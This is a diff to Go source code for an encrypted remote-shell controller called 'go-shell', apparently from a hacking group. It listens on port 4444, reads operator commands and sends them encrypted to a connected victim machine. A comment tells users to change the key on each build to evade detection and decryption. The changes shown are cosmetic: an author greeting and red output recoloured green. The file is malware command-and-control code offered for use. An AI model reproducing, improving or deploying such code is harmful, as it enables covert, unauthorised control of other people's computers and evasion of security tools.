@@ -1,5 +1,5 @@
 package main
-
+// coded by s1ege greetz to all GSH members
 import (
   "bufio"
   "net"
@@ -17,16 +17,15 @@ import (
 const port = ":4444"
 
 func main() {
-    red := color.New(color.FgHiRed, color.Bold)
     green := color.New(color.FgHiGreen, color.Bold)
     // enter your 32 byte long key here (change per each build to evade detection/decryption)
     key := []byte("024iF4ciIdeXt9Yxk9C97QsrNrxNXzEi")
-    red.Println("Listening....")
+    green.Println("Listening....")
     listener, _ := net.Listen("tcp", port)
     conn, _ := listener.Accept()
     for {
         reader := bufio.NewReader(os.Stdin)
-        red.Print("go-shell> ")
+        green.Print("go-shell> ")
         command, _ := reader.ReadString('\n')
         enc_command := encryption(true, key, command)
         if strings.Index(command, "exit") == 0 {
